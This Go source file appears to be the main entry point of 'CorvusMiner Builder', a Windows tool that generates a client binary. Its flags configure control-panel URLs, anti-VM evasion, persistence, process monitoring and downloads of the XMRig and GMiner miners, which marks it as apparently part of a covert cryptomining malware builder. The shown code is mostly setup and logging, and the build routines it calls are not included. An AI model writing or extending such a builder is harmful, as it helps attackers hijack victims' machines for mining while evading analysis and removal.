package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"path/filepath"
)

// Directories
var (
	clientDir string
	buildDir  string
)

// Reader for terminal input
var reader *bufio.Reader

// Command-line flags
var (
	panelURLFlag    = flag.String("panel-urls", "", "Panel URL(s) separated by commas")
	monitoringFlag  = flag.Bool("monitoring", false, "Enable process monitoring")
	debugFlag       = flag.Bool("debug", false, "Enable debug console")
	antiVMFlag      = flag.Bool("antivm", false, "Enable anti-VM detection")
	persistenceFlag = flag.Bool("persistence", false, "Enable persistence")
	outputFlag      = flag.String("output", "", "Output directory for the built binary")
	xmrigURLFlag    = flag.String("xmrig-url", "http://127.0.0.1:8080/api/miner/xmrig", "Download URL for XMRig miner")
	gminerURLFlag   = flag.String("gminer-url", "http://127.0.0.1:8080/api/miner/gminer", "Download URL for GMiner miner")
)

func init() {
	reader = bufio.NewReader(os.Stdin)

	// Resolve Client directory - look in parent or current directory
	clientDirRaw := findClientDir()
	var err error
	clientDir, err = filepath.Abs(clientDirRaw)
	if err != nil {
		// Fall back to relative path if Abs fails
		clientDir = clientDirRaw
	}
	buildDir = filepath.Join(clientDir, "build")
}

// findClientDir locates the Client directory
func findClientDir() string {
	// Try current directory first
	if _, err := os.Stat("./Client"); err == nil {
		return "./Client"
	}

	// Try parent directory (when running from Builder/)
	if _, err := os.Stat("../Client"); err == nil {
		return "../Client"
	}

	// Try absolute path based on executable location
	ex, err := os.Executable()
	if err == nil {
		exePath := filepath.Dir(ex)
		parentPath := filepath.Dir(exePath)
		candidatePath := filepath.Join(parentPath, "Client")
		if _, err := os.Stat(candidatePath); err == nil {
			return candidatePath
		}
	}

	// Default (will fail with better error message later)
	return "./Client"
}

func main() {
	flag.Parse()

	logInfo("CorvusMiner Builder - Windows Platform")

	// If flags are provided, use non-interactive mode
	if *panelURLFlag != "" {
		if err := buildClientNonInteractiveWindows(); err != nil {
			logError("Build failed: %v", err)
			os.Exit(1)
		}
		return
	}

	// Otherwise, use interactive mode
	windowsMain()
}

// Logging utilities
func logInfo(format string, args ...interface{}) {
	fmt.Printf("[INFO] "+format+"\n", args...)
}

func logError(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "[ERROR] "+format+"\n", args...)
}

func logSuccess(format string, args ...interface{}) {
	fmt.Printf("[SUCCESS] "+format+"\n", args...)
}
